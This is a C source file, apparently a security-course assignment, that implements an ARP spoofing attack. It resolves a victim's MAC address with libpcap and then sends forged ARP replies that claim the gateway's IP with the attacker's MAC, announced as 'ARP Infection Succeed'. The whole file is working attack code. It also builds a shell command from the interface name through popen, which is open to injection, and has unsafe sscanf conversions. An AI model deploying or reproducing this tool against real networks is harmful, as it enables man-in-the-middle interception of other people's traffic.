#include <sys/time.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <pcap/pcap.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <libnet.h>
#include <pthread.h>

#define PROMISCUOUS 1
#define NONPROMISCUOUS 0

#define IPSTR_MAX 16
#define MACSTR_MAX 18
#define IP_ALEN 4
#define ARPPKT_SIZE 42
#define ETHHDR_SIZE 14
#define ARPHDR_SIZE 8
#define ARPDAT_SIZE 20

char victim_mac_addr_str[MACSTR_MAX];
char victim_ip_addr_str[IPSTR_MAX];
char gateway_ip[IPSTR_MAX];
char my_ip[IPSTR_MAX];
char my_mac[MACSTR_MAX];

// http://stackoverflow.com/questions/3288065/getting-gateway-to-use-for-a-given-ip-in-ansi-c
void GetGatewayForInterface(const char *interface, char *gateway_ip)
{
    char cmd [1000] = {0x0};
    sprintf(cmd,"route -n | grep %s  | grep 'UG[ \t]' | awk '{print $2}'", interface);
    FILE* fp = popen(cmd, "r");

    fgets(gateway_ip, 256, fp);

    pclose(fp);
}

void packetfilter_callback(u_char *useless, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
    struct libnet_ethernet_hdr *eth_header;     // struct ethhdr 도 가능
    struct libnet_arp_hdr *arp_header;          // struct arphdr도 가능
    unsigned short etherh_protocoltype;

    char arp_sender_ip[IPSTR_MAX], arp_target_ip[IPSTR_MAX];
    char arp_sender_mac[MACSTR_MAX], arp_target_mac[MACSTR_MAX];

    eth_header = (struct libnet_ethernet_hdr *)packet;      // get ethernet header
    etherh_protocoltype = ntohs(eth_header->ether_type);    // get ethernet header -> protocol type

    printf(".");
    if(etherh_protocoltype == ETHERTYPE_ARP) {
        packet += sizeof(struct libnet_ethernet_hdr);       // move to offset
        arp_header = (struct libnet_arp_hdr *)packet;       // get arp header

        if(ntohs(arp_header->ar_op) == 2) {
            packet += sizeof(struct libnet_arp_hdr);        // move to offset
            inet_ntop(AF_INET, (struct in_addr *)(packet+6), arp_sender_ip, sizeof(arp_sender_ip));
            inet_ntop(AF_INET, (struct in_addr *)(packet+16), arp_target_ip, sizeof(arp_target_ip));
            sprintf(arp_sender_mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", *(packet), *(packet+1), *(packet+2), *(packet+3), *(packet+4), *(packet+5));
            sprintf(arp_target_mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", *(packet+10), *(packet+11), *(packet+12), *(packet+13), *(packet+14), *(packet+15));

            if(!strcmp(arp_sender_ip, victim_ip_addr_str)) {            // arp reply packet에서 victim ip에 대한 mac address 구하기.
                strncpy(victim_mac_addr_str, arp_sender_mac, MACSTR_MAX);
                printf("\n[*] Got Victim Mac Address : %s\n", victim_mac_addr_str);
                pthread_exit(NULL);
            }
        }
    }
}

void *get_victim_mac_pcap_thread(void *useless) {
    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 netp, maskp;
    struct bpf_program fp;

    char *dev = pcap_lookupdev(errbuf);       // dev = "ens33"으로 해도 무방
    if(dev == NULL) { printf("%s\n", errbuf); exit(1); }
    int ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
    if(ret == -1) { printf("%s\n", errbuf); exit(1); }
    pcap_t *pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, -1, errbuf);
    if(pcd == NULL) { printf("%s\n", errbuf); exit(1); }
    if(pcap_compile(pcd, &fp, "", 0, netp) == -1) { printf("compile error\n"); exit(1); }
    if(pcap_setfilter(pcd, &fp) == -1) { printf("setfilter error\n"); exit(0); }

    printf("[*] Getting Target Mac Address");
    pcap_loop(pcd, 0, packetfilter_callback, NULL);

    return 0;
}

void build_arp_packet(u_char* arp_packet, int operation) {
    unsigned char build_packet[ETHHDR_SIZE + ARPHDR_SIZE + ARPDAT_SIZE];

    unsigned char victim_mac_addr[ETH_ALEN];
    unsigned char my_mac_addr[ETH_ALEN];
    unsigned char myip_byte_arr[IP_ALEN];
    unsigned char victim_ip_byte_arr[IP_ALEN];
    unsigned char gateway_ip_byte_arr[4];

    struct libnet_ethernet_hdr *eth_header;
    struct libnet_arp_hdr *arp_header;
    struct arp_data {
        unsigned char ar_sha[ETH_ALEN];     /* Sender Hardware Address */
        unsigned char ar_sip[IP_ALEN];            /* Sender IP Address */
        unsigned char ar_tha[ETH_ALEN];     /* Target Hardware Address */
        unsigned char ar_tip[IP_ALEN];            /* Target IP Address */
    } *custom_arp_data;

    // my mac string -> mac 6byte
    sscanf(my_mac, "%2x:%2x:%2x:%2x:%2x:%2x", my_mac_addr, my_mac_addr+1, my_mac_addr+2, my_mac_addr+3, my_mac_addr+4, my_mac_addr+5);
    sscanf(my_ip, "%d.%d.%d.%d", myip_byte_arr, myip_byte_arr+1, myip_byte_arr+2, myip_byte_arr+3);
    sscanf(victim_ip_addr_str, "%d.%d.%d.%d", victim_ip_byte_arr, victim_ip_byte_arr+1, victim_ip_byte_arr+2, victim_ip_byte_arr+3);
    sscanf(gateway_ip, "%d.%d.%d.%d", gateway_ip_byte_arr, gateway_ip_byte_arr+1, gateway_ip_byte_arr+2, gateway_ip_byte_arr+3);

    eth_header = (libnet_ethernet_hdr *)build_packet;
    arp_header = (libnet_arp_hdr *)(build_packet + ETHHDR_SIZE);
    custom_arp_data = (arp_data *)(build_packet + ETHHDR_SIZE + ARPHDR_SIZE);

    // ehternet header build : destination MAC address, source MAC address(my mac), ether_type(ARP)
    for(int i=0; i<ETH_ALEN; i++) eth_header->ether_dhost[i] = '\xff';
    for(int i=0; i<ETH_ALEN; i++) eth_header->ether_shost[i] = my_mac_addr[i];
    eth_header->ether_type = htons(ETHERTYPE_ARP);

    // arp header
    arp_header->ar_hrd = htons(ARPHRD_ETHER);                      // Hardware type : 0x0001
    arp_header->ar_pro = htons(ETHERTYPE_IP);                      // Protocol type : 0x0800(ipv4)
    arp_header->ar_hln = 0x06; arp_header->ar_pln = 0x04;          // Hardware size : 0x06, Protocol size : 0x04

    // ARP Request Packet
    if(operation == 1) {
        arp_header->ar_op = htons(ARPOP_REQUEST);                                           // Opcode : 0x0001(request)
        for(int i=0; i<ETH_ALEN; i++) custom_arp_data->ar_sha[i]=my_mac_addr[i];            // arp header : sender mac address(my mac)
        for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_sip[i] = myip_byte_arr[i];         // arp header : sender ip address(my ip)
        for(int i=0; i<ETH_ALEN; i++) custom_arp_data->ar_tha[i] = 0x00;                    // arp header : target mac address(00:00:00:00:00:00)
        for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_tip[i] = victim_ip_byte_arr[i];    // arp header : target ip address(victim ip)
    }
    // ARP Reply Packet
    else if(operation == 2) {
        sscanf(victim_mac_addr_str, "%2x:%2x:%2x:%2x:%2x:%2x", victim_mac_addr, victim_mac_addr+1, victim_mac_addr+2, victim_mac_addr+3, victim_mac_addr+4, victim_mac_addr+5);

        for(int i=0; i<ETH_ALEN; i++) eth_header->ether_shost[i] = victim_mac_addr[i];      // ethernet header : destination MAC address
        arp_header->ar_op = htons(ARPOP_REPLY);                                             // Opcode : 0x0002(reply)
        for(int i=0; i<ETH_ALEN; i++) custom_arp_data->ar_sha[i] = my_mac_addr[i];          // arp header : sender mac address(my mac)
        for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_sip[i] = gateway_ip_byte_arr[i];   // arp header : sender ip address(gateway ip)
        for(int i=0; i<ETH_ALEN; i++) custom_arp_data->ar_tha[i] = victim_mac_addr[i];      // arp header : target mac address(victim mac)
        for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_tip[i] = victim_ip_byte_arr[i];    // arp header : target ip address(victim ip)
    }

    memcpy(arp_packet, build_packet, ARPPKT_SIZE);
}

int main(int argc, char **argv) {
    char track[] = "취약점"; char name[] = "이우진";
    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 netp, maskp;
    //char target_ip[IPSTR_MAX];

    //printf("Enter Target IP Addr : ");
    //scanf("%s", target_ip);
    strcpy(victim_ip_addr_str, argv[1]);
    //strcpy(victim_ip_addr_str, target_ip);

    printf("=====================================\n");
    printf("[bob5][%s]send_arp[%s]\n\n", track, name);
    // get network dev name("ens33")
    char *dev = pcap_lookupdev(errbuf);       // dev = "ens33"으로 해도 무방
    if(dev == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }
    printf("DEV: %s\n", dev);

    int ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
    if(ret == -1) {
        printf("%s\n", errbuf);
        exit(1);
    }

    pcap_t *pcd = pcap_open_live(dev, BUFSIZ, NONPROMISCUOUS, -1, errbuf);
    if(pcd == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }

    // /////////////////////////////////////////////////////////////////////////////////////////////////
    // Get Information(My IP Address, My MAC Address, Default Gateway IP Address, Victim MAC Address)
    struct ifreq ifr;
    u_char arp_packet[42];

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    snprintf(ifr.ifr_name, IFNAMSIZ, dev);
    ioctl(fd, SIOCGIFADDR, &ifr);
    // my ip addr 저장
    inet_ntop(AF_INET, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, my_ip, sizeof(my_ip));
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    sprintf(my_mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", (unsigned char)ifr.ifr_hwaddr.sa_data[0], (unsigned char)ifr.ifr_hwaddr.sa_data[1], (unsigned char)ifr.ifr_hwaddr.sa_data[2], (unsigned char)ifr.ifr_hwaddr.sa_data[3], (unsigned char)ifr.ifr_hwaddr.sa_data[4], (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
    /* and more importantly */
    printf("My IP addr : %s\n", my_ip);
    printf("My MAC addr : %s\n", my_mac);
    close(fd);

    GetGatewayForInterface(dev, gateway_ip);
    printf("GateWay IP addr : %s\n", gateway_ip);
    printf("=====================================\n");

    // /////////////////////////////////////////////////////////////////////////////////////////////////

    build_arp_packet(arp_packet, 1);

    pthread_t thread_id;
    pthread_create(&thread_id, NULL, get_victim_mac_pcap_thread, &pcd);
    sleep(3);
    for(int i=0; i<3; i++) {
        /* Send down the packet */
        if (pcap_sendpacket(pcd, arp_packet, 42 /* size */) != 0)
        {
            fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(pcd));
            return 0;
        }
    }
    pthread_join(thread_id, NULL);

    // arp reply attack
    build_arp_packet(arp_packet, 2);
    printf("[*] Sending Infected ARP Packet");
    for(int i=0; i<3; i++) {
        printf(".");
        /* Send down the packet */
        if (pcap_sendpacket(pcd, arp_packet, 42 /* size */) != 0)
        {
            fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(pcd));
            return 0;
        }
    }
    printf("\n[*] ARP Infection Succeed~!\n");
    printf("   - Target IP addr :%s\n", victim_ip_addr_str);
    printf("   - Target MAC addr :%s\n\n", victim_mac_addr_str);

    return 0;
}
